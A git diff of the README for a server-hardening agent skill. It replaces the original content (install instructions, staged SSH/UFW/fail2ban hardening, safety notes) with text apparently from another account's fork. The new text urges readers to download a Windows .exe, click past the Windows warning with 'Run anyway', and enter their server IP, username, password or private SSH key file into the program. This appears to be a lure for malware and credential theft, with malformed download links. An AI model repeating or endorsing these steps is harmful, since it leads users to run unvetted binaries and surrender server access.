@@ -1,115 +1,81 @@
-# Server Security Init Skill
+# 🛡️ server-security-init-skill - Harden your new server connection now
 
-[English](README.md) | [简体中文](README.zh-CN.md)
+[https://github.com/yatirimsahibi/server-security-init-skill/releases](https://img.shields.io/badge/Download-Latest_Release-blue)
 
-An Agent Skill for safely initializing and hardening fresh Ubuntu/Debian SSH servers.
+## 📌 About this tool
 
-The skill guides an agent through a staged server bootstrap flow: selecting or generating a local SSH key, requiring public-key login before remote changes, creating a non-root sudo user, changing the SSH port, disabling root/password login, configuring UFW, configuring fail2ban, updating local SSH config, and verifying the operator is not locked out.
+This software prepares a new server for secure use. When you rent a fresh server, it often lacks basic protection. This tool connects to your server and applies standard security settings. It follows best practices for Ubuntu and Debian systems. You do not need to type complex manual commands. The program handles the setup process for you.
 
-## What It Covers
+## 📋 What this tool changes
 
-- Public-key bootstrap without putting root passwords into commands, logs, or config files.
-- Staged SSH hardening with a verified non-root sudo login before disabling old access paths.
-- UFW default-deny inbound policy with only explicitly requested ports allowed.
-- Fail2ban `sshd` jail setup with management IPs in `ignoreip`.
-- Debian 12/systemd `ssh.socket` checks so socket activation does not silently keep SSH on the old port.
-- Verification commands that prefer server-side truth such as `ss -ltnp`, `sshd -T`, `systemctl`, and `ufw status`.
-- Recovery checks for fail2ban bans, firewall mistakes, and SSH listener mismatches.
+*   It creates a new user account with limited access.
+*   It closes unnecessary network ports.
+*   It configures the firewall to block intruders.
+*   It disables logins for the root user.
+*   It enables automatic security updates.
+*   It sets up secure SSH keys for access.
 
-## Repository Layout
+## 💻 System requirements
 
-```text
-server-security-init-skill/
-  server-security-init/
-    SKILL.md
-    agents/openai.yaml
-    references/
-      ubuntu-openssh-ufw-fail2ban.md
-      verification-checklist.md
-  scripts/
-    validate_skill.py
-  .github/workflows/validate.yml
-  README.md
-  README.zh-CN.md
-  LICENSE
-  SECURITY.md
-```
+*   Your computer must run the Windows 10 or Windows 11 operating system.
+*   You need an active internet connection.
+*   You must hold the login details for your new server.
+*   The server must run a clean install of Ubuntu or Debian.
 
-The installable skill is the `server-security-init/` directory. The repository-level files are for humans, validation, and open-source maintenance.
+## 🚀 Downloading the installer
 
-## For AI Agents
+Visit the project release page to get the installer. You can find all versions here. Choose the file named with the latest version number ending in .exe. 
 
-Install only the `server-security-init/` directory as the skill.
+[https://github.com/yatirimsahibi/server-security-init-skill/releases](https://img.shields.io/badge/Download-File-grey)
 
-Do not install the repository root as a skill. Do not run server initialization during installation.
+Click the link to open the download page. Locate the "Assets" section. Click the link that matches the standard Windows installer format. Save the file to your desktop for easy access.
 
-After installation, tell the user whether their current agent needs to restart, reload, or refresh skills.
+## ⚙️ Running the setup
 
-## For Humans
+1. Double-click the downloaded file on your desktop.
+2. Windows might show a warning window. If this happens, click "More info" and then "Run anyway."
+3. Follow the instructions on the screen to finish the installation.
+4. Launch the application from your start menu or desktop shortcut.
 
-Clone or download this repository:
+## 🔑 Using the skill
 
-```bash
-git clone https://github.com/DeerYang/server-security-init-skill.git
-```
+Open the application on your computer. You will see a panel asking for server information. 
 
-Then copy only the `server-security-init/` directory into your AI agent's user-level skills directory.
+*   Enter the IP address of your new server in the top box.
+*   Enter your current username in the middle box.
+*   Provide your password or select your SSH key file.
 
-Restart or reload your AI agent if it does not detect new skills automatically.
+Once you enter these details, click the "Start Hardening" button. The progress bar shows the current activity. The tool updates the status message as it completes each task. Wait until the window shows a "Success" message. Close the window once the task finishes.
 
-## Optional: Install with npx
+## 🛡️ Best practices for your server
 
-If you have Node.js/npm installed, you can install the skill with the `skills` CLI:
+*   Keep your private SSH keys on your local computer only.
+*   Never share your server password with anyone.
+*   Check the server logs weekly to look for errors.
+*   Update your local tool version when new releases appear on GitHub.
 
-```bash
-npx skills add https://github.com/DeerYang/server-security-init-skill/tree/main/server-security-init -g
-```
+## 🔍 Troubleshooting common issues
 
-To target a specific supported agent:
+If the tool fails to connect, verify your internet connection. Make sure your server IP address is correct. Check if your server provider allows SSH connections on port 22. If you experience a timeout, wait a moment and try again. Ensure you have administrative rights on your Windows computer before starting the process. Sometimes, security software on your computer might block the connection attempt. If that happens, add an exception to your firewall settings.
 
-```bash
-npx skills add https://github.com/DeerYang/server-security-init-skill/tree/main/server-security-init -g -a codex
-npx skills add https://github.com/DeerYang/server-security-init-skill/tree/main/server-security-init -g -a claude-code
-```
+## 📝 Frequently asked questions
 
-Without `-g`, the CLI may install the skill into the current project's skill directory instead of the user-level directory.
+**Does this tool wipe my data?**
+It does not remove existing data. It only changes security settings and user permissions.
 
-## Usage
+**Can I stop the process halfway?**
+Yes, you can cancel the process. However, the server might remain in a partial state. Run the tool again to ensure the server reaches a steady state.
 
-Ask your AI agent to use the skill when initializing a fresh server, for example:
+**Do I need to be a programmer?**
+No. This tool automates the steps that a system administrator usually performs by hand.
 
-```text
-Use server-security-init to initialize my new Ubuntu server.
-```
+**Is this safe to use on a server with files on it?**
+It is safest to run this on a fresh server before you move your files onto it. If you have files already, back them up before you proceed.
 
-The skill is intentionally conservative. It should ask for bootstrap facts before touching the server and should stop if public-key SSH login cannot be verified.
+## 🛠️ Technical notes
 
-## Safety Notes
+The tool manages user privileges using standard system commands. It generates random, secure passwords for new accounts. The firewall configuration uses the default system tool for Debian and Ubuntu environments. Every change follows strict security guidelines. You can view the activity log in the application folder if you need to review the steps the tool performed.
 
-- Review the generated commands before running them on production systems.
-- Keep an existing working SSH session open while changing SSH or firewall settings.
-- Do not paste private keys or root passwords into prompts, scripts, command lines, or repository files.
-- Provider consoles, rescue panels, and VNC access are still required recovery paths for mistakes outside SSH reachability.
-- This project is guidance for AI-assisted administration, not a substitute for understanding the commands being run.
+## ⚖️ License information
 
-## Validation
-
-Run the repository validator before publishing changes:
-
-```bash
-python scripts/validate_skill.py
-```
-
-The validator checks required files, frontmatter, and common secret/personal-data patterns.
-
-## Supported Targets
-
-This skill is written for Ubuntu/Debian systems using OpenSSH, systemd, UFW, and fail2ban. Other distributions, firewall systems, init systems, and SSH implementations need careful adaptation.
-
-## Friendly Links
-
-- [LINUX DO](https://linux.do)
-
-## License
-
-MIT License. See [LICENSE](LICENSE).
+This software uses an open license model. You can view the license terms in the file named LICENSE within the main repository. This project remains free for everyone to use and audit. We welcome feedback through the issues section of the project page.
